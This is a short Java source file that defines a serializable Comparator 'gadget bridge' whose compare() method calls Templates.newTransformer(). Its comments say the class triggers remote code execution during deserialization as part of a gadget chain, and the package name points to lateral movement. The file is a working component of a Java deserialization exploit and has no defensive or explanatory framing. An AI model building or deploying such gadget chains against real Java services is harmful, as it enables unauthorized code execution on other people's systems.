// Gadget bridge class — implements Comparator<Object> + Serializable
// Uses TemplatesImpl.newTransformer() to trigger RCE during compare().
// Based on b0t's SubMap.readResolve() chain.
package jvm_lateral;

import javax.xml.transform.Templates;
import java.io.Serializable;
import java.util.Comparator;

public class TemplatesComp implements Comparator<Object>, Serializable {
    private static final long serialVersionUID = 1L;

    private final Templates templates;

    public TemplatesComp(Templates templates) {
        this.templates = templates;
    }

    @Override
    public int compare(Object a, Object b) {
        try {
            templates.newTransformer();
        } catch (Exception e) {
            // Expected — payload fires before exception
        }
        return 0;
    }
}
